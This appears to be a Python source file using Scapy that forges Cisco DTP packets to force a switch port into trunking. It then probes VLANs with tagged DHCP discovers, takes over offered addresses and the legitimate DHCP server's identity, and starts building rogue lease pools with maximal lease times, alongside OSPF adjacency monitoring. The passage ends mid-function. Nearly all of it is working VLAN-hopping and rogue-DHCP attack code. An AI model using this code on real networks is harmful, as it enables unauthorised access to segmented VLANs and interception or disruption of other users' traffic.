import ipaddress
from pathlib import Path
import platform
from queue import Queue
import random
import shlex
import shutil
import subprocess
import sys
from threading import Event, Thread
import time

from scapy.all import (
    BOOTP,
DHCP,
    Dot1Q,
    Dot3,
    Ether,
    IP,
    LLC,
    SNAP,
    STP,
    UDP,
    get_if_addr,
    get_if_hwaddr,
    mac2str,
    sendp,
    sniff,
)
from scapy.contrib.dtp import DTP, DTPDomain, DTPStatus, DTPType
from scapy.contrib.ospf import OSPF_Hdr

DEFAULT_SUBNET_MASK = "255.255.255.0"
DEFAULT_PREFIX_LENGTH = 24
DEFAULT_DHCP_LEASE_TIME = 30 * 24 * 60 * 60
MAX_DHCP_LEASE_TIME = 0xFFFFFFFF
DEFAULT_DHCP_DISCOVER_VLANS = range(1, 30 + 1)
DEFAULT_INTERFACE = "eth0"
PVST_SNIFF_TIMEOUT = 10
DTP_REFRESH_INTERVAL = 20
DTP_REFRESH_REPEAT = 3
INTERFACE_IPV4_WAIT_INTERVAL = 2
INTERFACE_IPV4_WAIT_TIMEOUT = 60
OSPF_FULL_WAIT_TIMEOUT = 300
OSPF_SNIFF_FILTER = "ip proto 89 or (vlan and ip proto 89)"
DHCP_SNIFF_FILTER = "udp and (port 67 or 68) or (vlan and udp and (port 67 or 68))"
DHCP_DISCOVER_TYPES = {1, "discover"}
DHCP_OFFER_TYPES = {2, "offer"}
DHCP_REQUEST_TYPES = {3, "request"}
LEASE_HOST_MIN = 2
LEASE_HOST_MAX = 253


def print_step(status, message):
    """Print a consistent process status line."""
    print(f"[{status}] {message}", flush=True)


def run_command(description, command):
    """Run a subprocess command and print whether it succeeded."""
    print_step("START", description)
    try:
        subprocess.run(command, check=True)
    except subprocess.CalledProcessError as exc:
        print_step("FAIL", f"{description}: exit code {exc.returncode}")
        raise

    print_step("OK", description)


def run_capture_command(description, command):
    """Run a command that returns output and print whether it succeeded."""
    print_step("START", description)
    result = subprocess.run(
        command,
        capture_output=True,
        text=True,
        check=False,
    )
    if result.returncode != 0:
        print_step("FAIL", f"{description}: exit code {result.returncode}")
        result.check_returncode()

    print_step("OK", description)
    return result.stdout


def build_dtp_type_tlv():
    """Build the DTP trunk type TLV for 802.1Q trunking."""
    try:
        return DTPType(dtptype=b"\xA5")
    except AttributeError:
        print_step("FAIL", "This Scapy DTPType layer does not support dtptype")
        raise


def force_trunk(interface, mac_address="01:00:0C:CC:CC:CC", repeat=10, interval=1):
    """Sends a DTP packet to force the switch port into trunk mode."""
    print_step("START", f"Getting source MAC address for {interface}")
    source_mac = get_if_hwaddr(interface)
    print_step("OK", f"Source MAC address for {interface}: {source_mac}")

    print_step("START", f"Building DTP trunk packet for {mac_address} on {interface}")

    # DTP is carried in an 802.3 frame, then LLC/SNAP, then the Cisco DTP payload.
    # Dot3 is used here instead of Ether so Scapy writes a length field, not an
    # Ethernet II type field.
    packet = (
        Dot3(dst=mac_address, src=source_mac) /
        LLC(dsap=0xAA, ssap=0xAA, ctrl=0x03) /
        SNAP(OUI=0x00000C, code=0x2004) / # 0x2004 is the DTP protocol ID.
        DTP(ver=1, tlvlist=[
            # Empty domain avoids assuming the switch's VTP domain name.
            DTPDomain(domain=b""),
            # 0x03 is dynamic desirable.
            DTPStatus(status=b"\x03"),
            # 0xA5 is 802.1Q trunk encapsulation.
            build_dtp_type_tlv(),
        ])
    )

    print_step("OK", f"Built DTP packet: {packet.summary()}")
    print_step("START", f"Sending {repeat} DTP trunk packet(s) to {mac_address} on {interface}")
    for packet_number in range(1, repeat + 1):
        sendp(packet, iface=interface, verbose=False)
        print_step("OK", f"Sent DTP trunk packet {packet_number}/{repeat}")
        if packet_number != repeat:
            time.sleep(interval)
    print_step("OK", f"Finished sending DTP trunk packet burst on {interface}")


def periodic_dtp_trunking_worker(
    interface,
    stop_event,
    mac_address="01:00:0C:CC:CC:CC",
    refresh_interval=DTP_REFRESH_INTERVAL,
    repeat=DTP_REFRESH_REPEAT,
    packet_interval=1,
):
    """Keep refreshing DTP trunk negotiation until stop_event is set."""
    print_step(
        "START",
        f"Periodic DTP trunking refresh started on {interface} every {refresh_interval} second(s)",
    )
    while not stop_event.wait(refresh_interval):
        try:
            force_trunk(
                interface,
                mac_address=mac_address,
                repeat=repeat,
                interval=packet_interval,
            )
        except Exception as exc:
            print_step("WARN", f"Periodic DTP trunking refresh failed: {exc}")

    print_step("OK", f"Periodic DTP trunking refresh stopped on {interface}")


def start_periodic_dtp_trunking(
    interface,
    mac_address="01:00:0C:CC:CC:CC",
    refresh_interval=DTP_REFRESH_INTERVAL,
    repeat=DTP_REFRESH_REPEAT,
    packet_interval=1,
):
    """Start a background thread that periodically refreshes DTP trunking."""
    stop_event = Event()
    thread = Thread(
        target=periodic_dtp_trunking_worker,
        args=(interface, stop_event),
        kwargs={
            "mac_address": mac_address,
            "refresh_interval": refresh_interval,
            "repeat": repeat,
            "packet_interval": packet_interval,
        },
        daemon=True,
    )
    thread.start()
    return stop_event, thread


def stop_periodic_dtp_trunking(stop_event, thread, timeout=5):
    """Stop the background DTP refresh thread."""
    stop_event.set()
    thread.join(timeout=timeout)
    if thread.is_alive():
        print_step("WARN", "Periodic DTP trunking refresh thread did not stop cleanly")
    else:
        print_step("OK", "Periodic DTP trunking refresh thread stopped")


def countdown(description, seconds):
    """Print a countdown while waiting for the network to converge."""
    print_step("START", f"{description}: waiting {seconds} second(s)")
    for remaining in range(seconds, 0, -1):
        print_step("WAIT", f"{description}: {remaining} second(s) remaining")
        time.sleep(1)
    print_step("OK", description)


def sniff_pvst(iface="eth0", count=0, timeout=PVST_SNIFF_TIMEOUT):
    """Sniff for PVST+ BPDUs to discover active VLANs."""
    network_map = {"vlans": {}}

    def packet_callback(packet):
        try:
            if not packet.haslayer(STP) or not packet.haslayer(Dot1Q):
                return

            vlan_id = packet[Dot1Q].vlan
            stp = packet[STP]
            network_map["vlans"][vlan_id] = {
                "root_bridge_mac": stp.rootmac,
                "root_id": stp.rootid,
                "bridge_mac": stp.bridgemac,
            }
            print_step("OK", f"Discovered VLAN {vlan_id} via PVST+")
        except Exception as exc:
            print_step("WARN", f"Error processing PVST BPDU: {exc}")

    print_step("START", f"Sniffing for PVST+ BPDUs on {iface} for {timeout} seconds")
    try:
        sniff(
            iface=iface,
            lfilter=lambda packet: packet.haslayer(STP) and packet.haslayer(Dot1Q),
            prn=packet_callback,
            store=False,
            count=count,
            timeout=timeout,
        )
    except KeyboardInterrupt:
        pass
    except Exception as exc:
        print_step("WARN", f"Error during PVST sniffing: {exc}")

    print_step("OK", f"PVST sniff completed. Discovered {len(network_map['vlans'])} VLAN(s)")
    return network_map


def get_discovered_vlan_ids(network_map):
    """Return sorted VLAN IDs from a PVST discovery result."""
    return sorted(network_map.get("vlans", {}).keys())


def iter_dhcp_options(packet):
    """Yield DHCP option tuples from a packet."""
    if not packet.haslayer(DHCP):
        return

    for option in packet[DHCP].options:
        if isinstance(option, tuple) and len(option) >= 2:
            yield option[0], option[1]


def get_dhcp_options(packet):
    """Return first-seen DHCP options keyed by option name."""
    options = {}
    for option_name, option_value in iter_dhcp_options(packet):
        options.setdefault(option_name, option_value)
    return options


def get_dhcp_message_type(packet):
    """Return the DHCP message type option from a packet."""
    return next(
        (
            option_value
            for option_name, option_value in iter_dhcp_options(packet)
            if option_name == "message-type"
        ),
        None,
    )


def get_dhcp_option(packet, option_name):
    """Return a named DHCP option from a packet."""
    return next(
        (
            option_value
            for current_option_name, option_value in iter_dhcp_options(packet)
            if current_option_name == option_name
        ),
        None,
    )


def get_dhcp_lease_time():
    """Return the longest DHCP lease time supported by the option field."""
    if 0 < MAX_DHCP_LEASE_TIME <= 0xFFFFFFFF:
        return MAX_DHCP_LEASE_TIME

    return DEFAULT_DHCP_LEASE_TIME


def get_requested_address(packet):
    """Return the requested DHCP address option as a string."""
    requested_address = get_dhcp_option(packet, "requested_addr")
    if requested_address is None:
        return None

    try:
        return str(ipaddress.IPv4Address(requested_address))
    except ValueError:
        print_step("SKIP", f"Ignoring invalid requested address {requested_address}")
        return None


def is_dhcp_discover(packet):
    """Return whether a packet is a DHCPDISCOVER."""
    return get_dhcp_message_type(packet) in DHCP_DISCOVER_TYPES


def is_dhcp_offer(packet):
    """Return whether a packet is a DHCPOFFER."""
    return get_dhcp_message_type(packet) in DHCP_OFFER_TYPES


def is_dhcp_request(packet):
    """Return whether a packet is a DHCPREQUEST."""
    return get_dhcp_message_type(packet) in DHCP_REQUEST_TYPES


def get_offer_details(packet):
    """Extract useful details from a DHCPOFFER packet."""
    bootp = packet[BOOTP]
    options = get_dhcp_options(packet)
    vlan_id = packet[Dot1Q].vlan if packet.haslayer(Dot1Q) else None
    server_id = options.get("server_id")
    src_ip = packet[IP].src if packet.haslayer(IP) else None

    return {
        "vlan": vlan_id,
        "offered_ip": bootp.yiaddr,
        "server_id": server_id,
        "router": options.get("router"),
        "subnet_mask": options.get("subnet_mask"),
        "lease_time": options.get("lease_time"),
        "src_mac": packet[Ether].src if packet.haslayer(Ether) else None,
        "src_ip": src_ip,
        "dhcp_server_ip": server_id or src_ip,
        "xid": bootp.xid,
        "giaddr": bootp.giaddr,
    }


def get_first_ipv4_address(value):
    """Return the first IPv4 address from a Scapy DHCP option value."""
    if value is None:
        return None

    values = value if isinstance(value, (list, tuple)) else [value]
    for item in values:
        try:
            return str(ipaddress.IPv4Address(item))
        except ValueError:
            continue

    return None


def build_vlan_details_from_offers(offers):
    """Build VLAN-to-network details learned from upstream DHCPOFFER packets."""
    vlan_details = {}
    for offer in offers:
        vlan_id = offer.get("vlan")
        subnet_mask = offer.get("subnet_mask")
        router = get_first_ipv4_address(offer.get("router"))
        if not router and offer.get("giaddr") != "0.0.0.0":
            router = offer.get("giaddr")
        offered_ip = offer.get("offered_ip")

        if vlan_id is None or not subnet_mask:
            continue

        network_source = router or offered_ip
        if not network_source:
            continue

        try:
            network = ipaddress.IPv4Network(f"{network_source}/{subnet_mask}", strict=False)
        except ValueError as exc:
            print_step(
                "WARN",
                f"Skipping VLAN {vlan_id} offer details with invalid network data: {exc}",
            )
            continue

        vlan_details[vlan_id] = {
            "vlan_id": vlan_id,
            "network": network,
            "subnet_mask": subnet_mask,
            "router": router,
            "dhcp_server_ip": offer.get("dhcp_server_ip"),
            "offered_ip": offered_ip,
        }
        print_step(
            "OK",
            f"Learned VLAN {vlan_id} network={network} router={router} from DHCPOFFER",
        )

    return vlan_details


def normalize_vlan_ids(vlan_ids):
    """Return valid VLAN IDs in stable order without duplicates."""
    normalized_vlan_ids = []
    seen_vlan_ids = set()
    for vlan_id in vlan_ids:
        try:
            vlan_id = int(vlan_id)
        except (TypeError, ValueError):
            print_step("SKIP", f"Ignoring invalid VLAN ID {vlan_id}")
            continue

        if not 1 <= vlan_id <= 4094:
            print_step("SKIP", f"Ignoring out-of-range VLAN ID {vlan_id}")
            continue

        if vlan_id in seen_vlan_ids:
            continue

        normalized_vlan_ids.append(vlan_id)
        seen_vlan_ids.add(vlan_id)

    return normalized_vlan_ids


# Create a DHCPDiscover with a VLAN tag for each selected VLAN.
def send_DHCPDiscover_VLANs(interface, vlan_ids=None):
    """Create DHCPDISCOVER packets with VLAN tags for the selected VLANs."""
    # Create a DHCP Discover packet
    print_step("START", "Getting MAC Address from Interface")
    interface_MAC = get_if_hwaddr(interface)
    interface_MAC_bytes = mac2str(interface_MAC)
    print_step("OK", f"Hardware MAC Address: {interface_MAC}")

    selected_vlan_ids = normalize_vlan_ids(vlan_ids or DEFAULT_DHCP_DISCOVER_VLANS)
    if not selected_vlan_ids:
        print_step("WARN", "No VLAN IDs selected for DHCPDISCOVER probes")
        return

    print_step("START", f"Sending DHCPDISCOVER packets on VLANs {selected_vlan_ids}")
    for vlan_id in selected_vlan_ids:
        transaction_id = random.getrandbits(32)
        dhcp_discover = (
            # Set Ethernet src explicitly so Scapy/Npcap/libpcap does not choose
            # a different adapter MAC when the frame is sent.
            Ether(dst="ff:ff:ff:ff:ff:ff", src=interface_MAC)
            / Dot1Q(vlan=vlan_id)  # VLAN tag 
            / IP(src="0.0.0.0", dst="255.255.255.255") 
            / UDP(sport=68, dport=67) 
            # BOOTP chaddr is a raw hardware-address field, not a colon string.
            / BOOTP(op=1, htype=1, hlen=6, xid=transaction_id, chaddr=interface_MAC_bytes) 
            / DHCP(options=[("message-type", "discover"), "end"])
        )
        
        sendp(dhcp_discover, iface=interface, verbose=False)
        print_step("OK", f"Sent DHCPDiscover with VLAN ID {vlan_id} xid={transaction_id}")
        

# Sniff for DHCPOffer (Rmb to make it in a seperate Thread)
def sniff_DHCPOffer_packets(interface, timeout=30, count=0):
    """Sniff for DHCPOffer Packets from the Interface"""
    offers = []
    seen_offers = set()

    def handle_offer(packet):
        if not packet.haslayer(BOOTP) or not is_dhcp_offer(packet):
            return

        offer_details = get_offer_details(packet)
        offer_key = (
            offer_details["vlan"],
            offer_details["offered_ip"],
            offer_details["server_id"],
            offer_details["src_mac"],
        )
        if offer_key in seen_offers:
            print_step(
                "SKIP",
                f"Duplicate DHCPOFFER vlan={offer_details['vlan']} offered_ip={offer_details['offered_ip']}",
            )
            return

        seen_offers.add(offer_key)
        offers.append(offer_details)
        print_step(
            "OK",
            (
                f"DHCPOFFER vlan={offer_details['vlan']} "
                f"offered_ip={offer_details['offered_ip']} "
                f"server_id={offer_details['server_id']} "
                f"router={offer_details['router']} "
                f"src_mac={offer_details['src_mac']}"
            ),
        )

    print_step("START", f"Sniffing DHCPOFFER packets on {interface}")
    sniff(
        iface=interface,
        filter=DHCP_SNIFF_FILTER,
        lfilter=lambda packet: packet.haslayer(DHCP) and packet.haslayer(BOOTP),
        prn=handle_offer,
        store=False,
        timeout=timeout,
        count=count,
    )
    print_step("OK", f"Finished sniffing DHCPOFFER packets. Found {len(offers)} offer(s)")
    return offers


def set_static_address_windows(interface, address, netmask, gateway=None):
    """Set a static IP address on a Windows interface."""
    print_step("START", f"Preparing Windows static address setup for {interface}")

    # Release the DHCP lease first so Windows does not keep renewing the old address.
    run_command(
        f"Releasing DHCP lease on Windows interface {interface}",
        ["ipconfig", "/release", interface],
    )

    # Build the netsh command in list form so spaces in interface names are handled safely.
    command = [
        "netsh", "interface", "ipv4", "set", "address",
        f"name={interface}",
        "source=static",
        f"address={address}",
        f"mask={netmask}",
    ]

    # Apply the static address using the same interface name shown by ipconfig/netsh.
    run_command(
        f"Setting Windows static IP {address}/{netmask} on {interface}",
        command,
    )
    print_step("OK", f"Completed Windows static address setup for {interface}")
 

def get_kali_ipv4_addresses(interface):
    """Return current IPv4 addresses assigned to a Linux interface."""
    output = run_capture_command(
        f"Listing current IPv4 addresses on Linux interface {interface}",
        ["ip", "-4", "-o", "addr", "show", "dev", interface, "scope", "global"],
    )

    addresses = []
    for line in output.splitlines():
        parts = line.split()
        if "inet" in parts:
            inet_index = parts.index("inet")
            if inet_index + 1 < len(parts):
                addresses.append(parts[inet_index + 1])

    print_step("OK", f"Found {len(addresses)} existing IPv4 address(es) on {interface}")
    return addresses


def get_interface_ipv4_addresses(interface, scope="global"):
    """Return current non-zero IPv4 addresses for an interface without noisy polling logs."""
    if platform.system().lower() == "linux" and shutil.which("ip"):
        command = ["ip", "-4", "-o", "addr", "show", "dev", interface]
        if scope:
            command.extend(["scope", scope])
        result = subprocess.run(
            command,
            capture_output=True,
            text=True,
            check=False,
        )
        if result.returncode == 0:
            addresses = []
            for line in result.stdout.splitlines():
                parts = line.split()
                if "inet" in parts:
                    inet_index = parts.index("inet")
                    if inet_index + 1 < len(parts):
                        addresses.append(parts[inet_index + 1])
            return addresses

    try:
        address = get_if_addr(interface)
    except Exception:
        return []

    if address and address != "0.0.0.0":
        return [address]
    return []


def wait_for_interface_ipv4_address(interface, expected_address=None, timeout=INTERFACE_IPV4_WAIT_TIMEOUT):
    """Wait until an interface has a usable IPv4 address, optionally a specific one."""
    expected_message = f" {expected_address}" if expected_address else ""
    print_step("START", f"Waiting for {interface} to have IPv4 address{expected_message}")
    deadline = time.monotonic() + timeout if timeout is not None else None

    while True:
        addresses = get_interface_ipv4_addresses(interface)
        plain_addresses = [address.split("/", 1)[0] for address in addresses]
        if expected_address:
            if expected_address in plain_addresses:
                print_step("OK", f"{interface} has expected IPv4 address {expected_address}")
                return addresses
        elif addresses:
            print_step("OK", f"{interface} has IPv4 address(es): {addresses}")
            return addresses

        if deadline is not None and time.monotonic() >= deadline:
            waited_for = f" {timeout} seconds"
            print_step("FAIL", f"Timed out after{waited_for} waiting for IPv4 address on {interface}")
            raise TimeoutError(f"Timed out waiting for IPv4 address on {interface}")

        time.sleep(INTERFACE_IPV4_WAIT_INTERVAL)


def linux_interface_exists(interface):
    """Return whether a Linux network interface exists."""
    if platform.system().lower() != "linux" or not shutil.which("ip"):
        return False
    result = subprocess.run(
        ["ip", "link", "show", "dev", interface],
        capture_output=True,
        text=True,
        check=False,
    )
    return result.returncode == 0


def build_vlan_subinterface_name(parent_interface, vlan_id):
    """Return the Linux VLAN subinterface name for a parent interface and VLAN ID."""
    return f"{parent_interface}.{int(vlan_id)}"


def ensure_vlan_subinterface(parent_interface, vlan_id):
    """Create and bring up a Linux VLAN subinterface when an offer came from a tagged VLAN."""
    if vlan_id is None:
        return parent_interface

    vlan_id = int(vlan_id)
    if not 1 <= vlan_id <= 4094:
        raise ValueError(f"Invalid VLAN ID for subinterface creation: {vlan_id}")

    system = platform.system().lower()
    if system != "linux":
        raise OSError("VLAN subinterface creation is only supported on Linux/Kali")
    if not shutil.which("ip"):
        raise FileNotFoundError("The Linux 'ip' command is required to create VLAN subinterfaces")

    if parent_interface.endswith(f".{vlan_id}"):
        subinterface = parent_interface
    else:
        subinterface = build_vlan_subinterface_name(parent_interface, vlan_id)

    if linux_interface_exists(subinterface):
        print_step("OK", f"VLAN subinterface {subinterface} already exists")
    else:
        run_command(
            f"Creating VLAN {vlan_id} subinterface {subinterface} on {parent_interface}",
            ["ip", "link", "add", "link", parent_interface, "name", subinterface, "type", "vlan", "id", str(vlan_id)],
        )

    run_command(
        f"Bringing parent interface {parent_interface} up",
        ["ip", "link", "set", parent_interface, "up"],
    )
    run_command(
        f"Bringing VLAN subinterface {subinterface} up",
        ["ip", "link", "set", subinterface, "up"],
    )
    return subinterface


def add_loopback_ipv4_address(address, prefix_length=32):
    """Add the DHCP server identity as a loopback IPv4 address on Linux."""
    if platform.system().lower() != "linux":
        raise OSError("Loopback DHCP server identity setup is only supported on Linux/Kali")
    if not shutil.which("ip"):
        raise FileNotFoundError("The Linux 'ip' command is required to add the loopback address")

    ipaddress.IPv4Address(address)
    existing_addresses = [
        current_address.split("/", 1)[0]
        for current_address in get_interface_ipv4_addresses("lo", scope=None)
    ]
    if address in existing_addresses:
        print_step("OK", f"Loopback already has DHCP server identity {address}")
    else:
        run_command(
            f"Adding DHCP server identity {address}/{prefix_length} to loopback",
            ["ip", "addr", "add", f"{address}/{prefix_length}", "dev", "lo"],
        )

    run_command(
        "Bringing loopback interface up",
        ["ip", "link", "set", "lo", "up"],
    )


def wait_for_ospf_adjacency_exchange(interface, source_ip, timeout=OSPF_FULL_WAIT_TIMEOUT):
    """Wait for OSPF LS exchange traffic from a neighbor on the wire."""
    seen = []

    def handle_packet(packet):
        if packet.haslayer(OSPF_Hdr) and packet.haslayer(IP) and packet[IP].src != source_ip:
            packet_type = int(packet[OSPF_Hdr].type)
            if packet_type in {4, 5}:
                seen.append(packet_type)
                return True
        return False

    print_step("START", f"Waiting up to {timeout} seconds for OSPF adjacency exchange on {interface}")
    sniff(iface=interface, filter=OSPF_SNIFF_FILTER, store=False, timeout=timeout, stop_filter=handle_packet)
    if seen:
        print_step("OK", f"Detected OSPF adjacency exchange packet type {seen[-1]} on {interface}")
        return

    print_step("FAIL", f"Timed out waiting for OSPF adjacency exchange on {interface}")
    raise TimeoutError(f"Timed out waiting for OSPF adjacency exchange on {interface}")


def remove_kali_ipv4_addresses(interface):
    """Remove every current IPv4 address from a Linux interface."""
    print_step("START", f"Removing existing IPv4 addresses from Linux interface {interface}")
    addresses = get_kali_ipv4_addresses(interface)
    if not addresses:
        print_step("OK", f"No existing IPv4 addresses found on Linux interface {interface}")
        return

    for current_address in addresses:
        run_command(
            f"Removing existing Linux IPv4 address {current_address} from {interface}",
            ["ip", "addr", "del", current_address, "dev", interface],
        )
    print_step("OK", f"Removed {len(addresses)} existing IPv4 address(es) from {interface}")


def set_static_address_kali(interface, address, netmask, gateway=None):
    """Set a static IP address on a Kali Linux interface."""
    print_step("START", f"Preparing Kali static address setup for {interface}")

    # Stop dhclient first so it does not immediately re-add the DHCP address.
    if shutil.which("dhclient"):
        run_command(
            f"Releasing DHCP lease on Linux interface {interface}",
            ["dhclient", "-r", interface],
        )
    else:
        print_step("SKIP", "dhclient was not found; skipping DHCP lease release")

    # Convert dotted-decimal netmask into CIDR because Linux ip addr add uses prefix length.
    prefix_length = ipaddress.IPv4Network(f"0.0.0.0/{netmask}").prefixlen

    # Delete known global IPv4 addresses one by one, then flush as a backup cleanup.
    remove_kali_ipv4_addresses(interface)
    run_command(
        f"Flushing addresses on Linux interface {interface}",
        ["ip", "-4", "addr", "flush", "dev", interface, "scope", "global"],
    )

    # Re-check after flush because NetworkManager/dhclient can sometimes leave or re-add one.
    remove_kali_ipv4_addresses(interface)

    # Add the static address that came from the selected DHCPOFFER.
    run_command(
        f"Adding Linux static IP {address}/{prefix_length} on {interface}",
        ["ip", "addr", "add", f"{address}/{prefix_length}", "dev", interface],
    )

    # Ensure the interface is administratively up after address changes.
    run_command(
        f"Bringing Linux interface {interface} up",
        ["ip", "link", "set", interface, "up"],
    )

    print_step("SKIP", "Skipping default gateway setup")

    print_step("OK", f"Completed Kali static address setup for {interface}")


def set_static_address(interface, address, netmask, gateway=None):
    """Set a static IP address on the current operating system."""
    system = platform.system().lower()
    print_step("START", f"Detected operating system: {system}")

    if system == "windows":
        set_static_address_windows(interface, address, netmask, gateway)
    elif system == "linux":
        set_static_address_kali(interface, address, netmask, gateway)
    else:
        print_step("FAIL", f"Unsupported operating system: {platform.system()}")
        raise OSError(f"Unsupported operating system for static address setup: {platform.system()}")

    print_step("OK", f"Static address setup finished on {interface}")


def get_offered_client_ip(offer):
    """Return the client IP offered by the upstream DHCP server."""
    address = offer.get("offered_ip")
    if not address or address == "0.0.0.0":
        print_step("FAIL", "DHCPOFFER does not contain a usable offered client IP")
        raise ValueError("DHCPOFFER does not contain a usable offered client IP")
    ipaddress.IPv4Address(address)
    return address


def get_original_dhcp_server_ip(offer):
    """Return the original DHCP server identity from one parsed DHCPOFFER."""
    address = offer.get("dhcp_server_ip") or offer.get("server_id") or offer.get("src_ip")
    if not address or address == "0.0.0.0":
        print_step("FAIL", "DHCPOFFER does not contain a usable DHCP server IP")
        raise ValueError("DHCPOFFER does not contain a usable DHCP server IP")
    ipaddress.IPv4Address(address)
    return address


def set_static_address_from_offer(interface, offer):
    """Set this host's VLAN interface to the client IP from one parsed DHCPOFFER."""
    address = get_offered_client_ip(offer)
    netmask = offer.get("subnet_mask")

    print_step("START", f"Preparing offered VLAN interface address from offer: {offer}")
    if not netmask:
        print_step("FAIL", "DHCPOFFER does not contain a subnet mask")
        raise ValueError("DHCPOFFER does not contain a subnet mask")

    print_step("OK", f"Selected offered client IP {address} as this host's VLAN interface address")
    set_static_address(interface, address, netmask)
    return address


def build_server_details_from_offer(interface, offer, offers=None):
    """Build DHCP server settings from the selected upstream DHCPOFFER."""
    server_ip = get_original_dhcp_server_ip(offer)
    netmask = offer.get("subnet_mask")
    gateway = get_first_ipv4_address(offer.get("router"))
    vlan_details = build_vlan_details_from_offers(offers or [offer])

    print_step("START", f"Building fallback DHCP server details from offer: {offer}")
    if not netmask:
        print_step("FAIL", "Selected offer does not contain a subnet mask")
        raise ValueError("Selected offer does not contain a subnet mask")

    details = {
        "interface": interface,
        "source_ip": server_ip,
        "gateway": gateway,
        "netmask": netmask,
        "network": ipaddress.IPv4Network(f"{server_ip}/{netmask}", strict=False),
        "vlan_details": vlan_details,
    }
    print_step("OK", f"Fallback DHCP server details: {details}")
    return details


def get_server_mac(server_details):
    """Return the server interface MAC, caching it after the first lookup."""
    server_mac = server_details.get("server_mac")
    if server_mac is None:
        server_mac = get_if_hwaddr(server_details["interface"])
        server_details["server_mac"] = server_mac
    return server_mac


def get_client_key(packet):
    """Return a stable key for matching a client DHCPDISCOVER to its DHCPREQUEST."""
    bootp = packet[BOOTP]
    hlen = bootp.hlen or 6
    chaddr = bootp.chaddr

    if isinstance(chaddr, bytes):
        client_id = chaddr[:hlen].hex(":")
    else:
        client_id = str(chaddr)

    return (bootp.xid, client_id)


def get_bootp_client_mac(packet):
    """Return the BOOTP client hardware address as a colon-separated MAC."""
    if not packet.haslayer(BOOTP):
        return None

    bootp = packet[BOOTP]
    hlen = bootp.hlen or 6
    chaddr = bootp.chaddr
    if not isinstance(chaddr, bytes):
        return None

    client_mac = chaddr[:hlen]
    if len(client_mac) != 6:
        return None

    return client_mac.hex(":")


def get_packet_vlan_id(packet):
    """Return the packet VLAN ID when Scapy decoded an 802.1Q tag."""
    if packet.haslayer(Dot1Q):
        return packet[Dot1Q].vlan

    return None


def get_effective_relay_agent_ip(packet, server_details):
    """Use packet giaddr when present; otherwise use the learned VLAN gateway."""
    giaddr = packet[BOOTP].giaddr
    if giaddr != "0.0.0.0":
        return giaddr

    return giaddr


def get_learned_vlan_details(packet, server_details):
    """Return DHCPOFFER-learned network details for the packet VLAN."""
    vlan_id = get_packet_vlan_id(packet)
    if vlan_id is None:
        return None

    return server_details.get("vlan_details", {}).get(vlan_id)


def get_direct_client_network(packet, requested_address, server_details):
    """Infer the client network for non-relayed DHCP traffic."""
    vlan_details = get_learned_vlan_details(packet, server_details)
    if vlan_details:
        return vlan_details["network"]

    if requested_address:
        return ipaddress.IPv4Network(f"{requested_address}/{DEFAULT_PREFIX_LENGTH}", strict=False)

    vlan_id = get_packet_vlan_id(packet)
    if vlan_id is not None:
        if 1 <= vlan_id <= 254:
            return ipaddress.IPv4Network(f"192.168.{vlan_id}.0/{DEFAULT_PREFIX_LENGTH}")

    return server_details["network"]


def get_direct_client_subnet_mask(packet, network, server_details):
    """Return the direct-client subnet mask, preferring learned VLAN data."""
    vlan_details = get_learned_vlan_details(packet, server_details)
    if vlan_details:
        return vlan_details["subnet_mask"]

    return str(network.netmask)


def get_direct_client_router(packet, network, server_details):
    """Return the direct-client router, preferring learned VLAN data."""
    vlan_details = get_learned_vlan_details(packet, server_details)
    if vlan_details and vlan_details.get("router"):
        return vlan_details["router"]

    return get_default_router_for_network(network, server_details.get("gateway"))


def get_default_router_for_network(network, fallback_gateway=None):
    """Use the conventional .1 gateway for inferred client networks."""
    if network.prefixlen == DEFAULT_PREFIX_LENGTH:
        return str(network.network_address + 1)

    return fallback_gateway


def get_relayed_client_network(giaddr, requested_address):
    """Infer the client network for relay-forwarded DHCP traffic."""
    relay_network = ipaddress.IPv4Network(f"{giaddr}/{DEFAULT_PREFIX_LENGTH}", strict=False)
    if requested_address:
        requested_network = ipaddress.IPv4Network(
            f"{requested_address}/{DEFAULT_PREFIX_LENGTH}",
            strict=False,
        )
        if requested_network != relay_network:
            print_step(
                "WARN",
                (
                    f"Relay giaddr {giaddr} points to {relay_network}, "
                    f"but requested address {requested_address} points to {requested_network}; "
                    "using requested-address network for the lease pool"
                ),
            )
            return requested_network

    return relay_network


def get_or_add_dhcp_network(packet, networks, server_details):
    """Track either the directly attached network or the relay-forwarded network."""
    giaddr = packet[BOOTP].giaddr
    relay_agent_ip = get_effective_relay_agent_ip(packet, server_details)
    requested_address = get_requested_address(packet)
    vlan_id = get_packet_vlan_id(packet)

    # giaddr is 0.0.0.0 for directly attached clients. Otherwise, the packet
    # came through a DHCP relay and the relay address identifies the client net.
    if giaddr == "0.0.0.0":
        network = get_direct_client_network(packet, requested_address, server_details)
        subnet_mask = get_direct_client_subnet_mask(packet, network, server_details)
        network_key = ("direct", str(network))
        router = get_direct_client_router(packet, network, server_details)
        excluded_addresses = {server_details["source_ip"]}
        if router:
            excluded_addresses.add(router)
        mode = "direct"
    else:
        network = get_relayed_client_network(giaddr, requested_address)
        subnet_mask = DEFAULT_SUBNET_MASK
        network_key = ("relay", str(network))
        router = get_default_router_for_network(network, giaddr)
        excluded_addresses = {giaddr}
        if router:
            excluded_addresses.add(router)
        mode = "relay"

    for dhcp_network in networks:
        if dhcp_network["key"] == network_key:
            if vlan_id is not None and dhcp_network.get("vlan_id") != vlan_id:
                print_step(
                    "OK",
                    f"Updating DHCP {mode} network {network} vlan={vlan_id}",
                )
                dhcp_network["vlan_id"] = vlan_id
            return dhcp_network

    dhcp_network = {
        "key": network_key,
        "giaddr": giaddr,
        "relay_agent_ip": relay_agent_ip,
        "mode": mode,
        "vlan_id": vlan_id,
        "network": network,
        "subnet_mask": subnet_mask,
        "router": router,
        "excluded_addresses": excluded_addresses,
        "leased_addresses": set(),
        "proposed_addresses": set(),
    }
    networks.append(dhcp_network)
    print_step("OK", f"Tracking DHCP {mode} network {network} vlan={vlan_id}")
    return dhcp_network


def is_lease_address_available(dhcp_network, address):
    """Return whether an address can be offered in this DHCP network."""
    network = dhcp_network["network"]
    try:
        ip_address = ipaddress.IPv4Address(address)
    except ValueError:
        return False

    if ip_address not in network:
        return False
    host_number = int(ip_address) - int(network.network_address)
    if not LEASE_HOST_MIN <= host_number <= LEASE_HOST_MAX:
        return False

    address = str(ip_address)
    if address in dhcp_network["excluded_addresses"]:
        return False
    if address in dhcp_network["leased_addresses"]:
        return False
    if address in dhcp_network["proposed_addresses"]:
        return False

    return True


def reserve_lease_address(dhcp_network, address):
    """Reserve an address for a pending DHCP offer."""
    dhcp_network["proposed_addresses"].add(address)
